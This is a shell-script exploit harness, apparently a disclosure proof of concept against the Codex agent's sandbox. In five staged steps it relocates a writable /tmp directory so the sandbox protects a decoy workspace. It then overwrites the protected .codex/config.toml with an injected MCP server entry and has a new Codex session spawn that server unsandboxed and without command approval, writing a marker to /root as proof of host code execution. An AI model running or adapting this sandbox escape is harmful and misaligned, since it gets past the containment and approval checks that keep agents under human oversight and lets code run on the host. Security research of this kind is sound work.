#!/bin/sh
set -eu

export CODEX_HOME=/tmp/codex-home
lab=/tmp/codex-relocation-poc
project="$lab/project"
moved_lab=/tmp/codex-relocation-poc.moved
marker=/root/codex-mcp-host-rce

mkdir -p "$CODEX_HOME" "$project/.git" "$project/.codex"
printf 'initial = true\n' > "$project/.codex/config.toml"
printf '[projects."%s"]\ntrust_level = "trusted"\n' "$project" > "$CODEX_HOME/config.toml"

printf '%s\n' '[1/5] Baseline: .codex is protected in an ordinary Codex sandbox'
if codex sandbox -P :workspace -C "$project" -- \
    /bin/sh -c 'printf overwritten > .codex/config.toml'
then
    printf '%s\n' 'FAIL: baseline unexpectedly wrote .codex/config.toml' >&2
    exit 1
else
    printf '%s\n' 'PASS: ordinary sandbox write was denied'
fi

if codex sandbox -P :workspace -C "$project" -- \
    /bin/sh -c 'printf sandboxed > /root/codex-mcp-host-rce'
then
    printf '%s\n' 'FAIL: baseline sandbox unexpectedly wrote the host-only marker' >&2
    exit 1
else
    printf '%s\n' 'PASS: ordinary sandbox also cannot write the host-only /root marker'
fi

if ! grep -qx 'initial = true' "$project/.codex/config.toml"
then
    printf '%s\n' 'FAIL: baseline changed the protected config' >&2
    exit 1
fi

printf '%s\n' '[2/5] First sandbox: relocate the writable /tmp ancestor and create a decoy workspace'
codex sandbox -P :workspace -C "$project" -- /bin/sh /opt/poc/stage1.sh

if [ ! -d "$moved_lab/project/.codex" ] || [ ! -d "$project" ]
then
    printf '%s\n' 'FAIL: stage one did not create the expected moved/decoy layout' >&2
    exit 1
fi

printf '%s\n' '[3/5] Second sandbox: protection attaches to the decoy; overwrite the moved real .codex'
codex sandbox -P :workspace -C "$project" -- /bin/sh /opt/poc/stage2.sh

if ! grep -q '^\[mcp_servers.relocation_poc\]$' "$project/.codex/config.toml"
then
    printf '%s\n' 'FAIL: protected project config was not replaced' >&2
    exit 1
fi
printf '%s\n' 'PASS: moved real .codex/config.toml was overwritten and restored to the trusted path'

printf '%s\n' '[4/5] Start a real Codex session; its initial MCP runtime should spawn the injected command'
set +e
OPENAI_API_KEY=not-a-real-key timeout 12 codex exec \
    --ephemeral \
    --skip-git-repo-check \
    --color never \
    -C "$project" \
    'Reply with OK.' > /tmp/codex-exec.log 2>&1
codex_status=$?
set -e

if [ ! -f "$marker" ]
then
    printf '%s\n' 'FAIL: injected MCP process did not create the host marker' >&2
    printf '%s\n' '--- codex exec log ---' >&2
    sed -n '1,160p' /tmp/codex-exec.log >&2
    exit 1
fi

if ! grep -qx 'CODEX_MCP_HOST_RCE' "$marker"
then
    printf '%s\n' 'FAIL: host marker exists but does not contain the expected payload evidence' >&2
    sed -n '1,80p' "$marker" >&2
    exit 1
fi

printf '%s\n' '[5/5] SUCCESS'
printf '%s\n' '--- unsandboxed MCP payload evidence ---'
sed -n '1,80p' "$marker"
printf 'codex exec exit status: %s (API failure/timeout is expected after MCP startup)\n' "$codex_status"
printf '%s\n' 'Impact demonstrated: sandboxed code changed protected project config, then Codex spawned an unsandboxed local MCP process without command approval.'
